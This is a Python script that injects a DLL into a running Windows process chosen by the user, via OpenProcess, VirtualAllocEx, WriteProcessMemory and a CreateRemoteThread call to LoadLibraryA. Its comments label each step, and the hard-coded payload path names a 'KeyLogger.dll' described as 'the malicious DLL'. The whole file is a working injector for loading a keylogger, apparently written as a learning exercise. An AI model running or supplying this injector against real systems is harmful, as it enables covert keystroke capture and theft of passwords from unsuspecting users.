### Import List
import ctypes
import win32api
import time
import sys

### Global Variables
### These are just static values defined my windows for memory operations
### More information available @ Windows -> Memory Protection Constraints
PROCESS_ALL_ACCESS = 0x1F0FFF # This is the value for the permission level we need to open and write to a process
RESERVE_MEMORY = 0x00002000 # Our DLL needs space in memory, as such, we reserve it
COMMIT_MEMORY = 0x00001000 # Commit the reserved memory
PAGE_READWRITE = 0x04 #Since we arent executing shellcode, this only needs to be Read/Write -> shellcode injection would be PAGE_EXECUTE_READWRITE (0x40)

### Process Injection Workflow
### 1 - Identify a process to inject into (prompt user for this)
### 2 - Get a handle to the process
### 3 - With the handle, create a space in the memory for the malicious DLL
### 4 - Write the dll into the process memory
### 5 - Since LoadLibraryA isnt callable by default with Ctypes, we need its handle
### 6 - Call the new dll using load library

### Define the path to the DLL (keeping this static cause im lazy)
dll_path = dll_path = "C:\\Users\\Sam\\source\\repos\\KeyLogger\\Release\\KeyLogger.dll"


### Step 1 - Prompt the user for a PID 
pid = int(input("Enter a 32bit Process ID: "))

### Step 2 - Get a handle to the process
handle_to_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
print("\n[DEBUGGING] The value for handle_process_is:", hex(handle_to_process))
time.sleep(1)
if not handle_to_process:
    print("Unable to get handle to process, please ensure process is 32bit and exists")
    sys.exit(1)

### Step 3 - Using the process handle, make some space in memory for our new dll
## For this to work, we need to know the size of the path to the DLL
dll_path_bytes = dll_path.encode('utf-8')
created_memory = ctypes.windll.kernel32.VirtualAllocEx(handle_to_process, None, len(dll_path_bytes), RESERVE_MEMORY | COMMIT_MEMORY, PAGE_READWRITE)
print('[DEBUGGING] Memory successfully allocated at:', hex(created_memory))
time.sleep(1)
if not created_memory:
    print("Something went wrong allocating memory space... Exiting")
    sys.exit(1)

### Step 4 - With a space in memory now created, we need to load the dll path into it
if not ctypes.windll.kernel32.WriteProcessMemory(handle_to_process, created_memory, dll_path_bytes, len(dll_path_bytes), None): 
    print("Something went wrong writing the DLL into the memory... Troubleshoot here")
    sys.exit(1)
### Step 5 - Use GetModuleHandle & GetProcAddress to get a handle to LoadLibraryA
## To call the LoadLibrary Module, we need to first get a handle to it
kernel32_handle = ctypes.windll.kernel32.GetModuleHandleA(b"Kernel32.dll")
load_library_handle = ctypes.windll.kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")
print("[DEBUGGING] Handle to kernel32.dll is", hex(kernel32_handle))
time.sleep(1)
print("[DEBUGGING] Handle to LoadLibraryA is", hex(load_library_handle))
time.sleep(1)
if not load_library_handle:
    print("Couldnt get a handle to LoadLibary... Exiting")
    sys.exit(1)

### Step 6 - Use CreateRemoteThread to start a remote thread within the target process
## within this remote thread, we call LoadLibraryA to load our DLL
handle_thread = ctypes.windll.kernel32.CreateRemoteThread(handle_to_process, None, 0, load_library_handle, created_memory, 0, None)
print("[DEBUGGING] The value for handle_thread is:", hex(handle_thread))
time.sleep(3)
if not handle_thread:
    print("Failed at CreateRemoteThread stage - Exiting...")
    sys.exit(1)


print("\nDLL Successfully injected into target pid!!")
print("You can check for this in process hacker\n")
time.sleep(1)
print("You can safely close this script window :)")


### Kernel32 Function References
## VirtualAllocEx - https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
## CreateRemoteThread - https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
## LoadLibraryA - https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
## GetProcAddress - https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
## WriteProcessMemory - https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
## OpenProcess - https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
## GetModuleHandleA - https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
